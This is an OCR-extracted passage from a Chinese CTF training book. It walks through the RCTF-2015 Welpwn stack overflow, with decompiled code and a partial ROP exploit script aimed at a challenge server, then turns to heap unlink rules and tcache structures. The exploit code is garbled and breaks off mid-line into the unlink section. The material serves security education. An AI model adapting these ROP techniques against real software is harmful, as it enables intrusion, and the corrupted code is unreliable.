http://blog.naver.com/PostView.nhn?
blogld=mathboy7&logNo=220335795719&categoryNo=0&parentCateg
oryNo=0&viewDate=&currentPage=1&postListTopCurrentPage=1
2)https://qoobee.org/-leoc/CTF/2015/codegate/final/chess/
---
## Page 447
CTF特训营：技术详解、解题方法与
12.6.4 (RCTF-2015)Welpwn(PWN200)
447/1144
12.6.4{RCTF-2015}Welpwn(PWN200)
该题明显是栈溢出，不过因为是0字符截断，所以虽然同样是控
制返回值和参数，但此题选择只覆盖rbp的最低字节使其为0。这样，
在main函数返回时，会进行一次栈转移。
因此在输入的时候构造了一个32字节的ROP，通过栈喷射，可
以更大概率地确保栈转移后跳入ROP开始的位置上。welpwn逻辑的
反编译代码如图12-46所示。
int
_fastcallecho(__int64a1)
chars2[16];//[sp+10h][bp-10h]@2
for（i=0;*（_BYTE*）（i+a1）;++i）
s2[i]=*（_BYTE*）（i+a1）;
s2[i]=0;
if（!strcmp（"ROIS",s2））
printf("RCTF{Welcome}",s2);
puts（"is not flag"）;
return printf（"%s",s2）;
---
## Page 448
CTF特训营：技术详解、解题方法与
12.6.4 (RCTF-2015)Welpwn(PWN200)
448/1144
图12-46welpwn逻辑的反编译代码
完整的exp代码如下：
#target='/welpwn'
target= (180.76.178.48',6666)
def exp(target):
io=zio（target,timeout=10000,print_read=COLORED（RAW,red),print_write=
COLORED（RAW,green))
io.readuntil(RCTF\n)
payload='a*0x10+x00*8
puts_plt=0x00000000004005A0
puts_got=0x0000000000601018
0000000000000x0=0do
main=0x00000000004007CD
rop =164(pop_rdi_ret)+164(puts_got)+164(puts_plt)+164(main)
while len(payload)fd;
BK = P->bk;
FD->bk=BK
BK->fd = FD;
{
上述代码直接进行了如下赋值：
*（fd +24)=bk
*(bk +16)=fd
---
## Page 460
CTF特训营：技术详解、解题方法与
13.1.4free基本规则
460/1144
新式的unlink中加入了更多的限制条件，具体参见unlink的利用方
法。
---
## Page 461
CTF特训营：技术详解、解题方法与
13.1.5 tcache
461/1144
13.1.5tcache
tcache是libc2.26之后引l进的一种新机制，广泛应用于18.04之后
的系统，其管理方式类似于fastbin，每条链上最多可以有7个
chunk，只有tcache满了以后，chunk才会被放回其他链表，而在进行
malloc操作时，tcache会被首先分配。
1.tcache的管理结构
tcache的两个重要结构体为tcache_entry和
tcache_pertheread_struct，具体如下。
tcache_entry结构体：
typedef struct tcache_entry
struct tcache_entry *next;
}tcache_entry;
tcache_pertheread_struct结构体：
typedef struct tcache_perthread_struct
charcounts[TCACHE_MAX_BINS];
tcache_entry*entries[TCACHE_MAX_BINS];
---
## Page 462
CTF特训营：技术详解、解题方法与
13.1.5 tcache
462/1144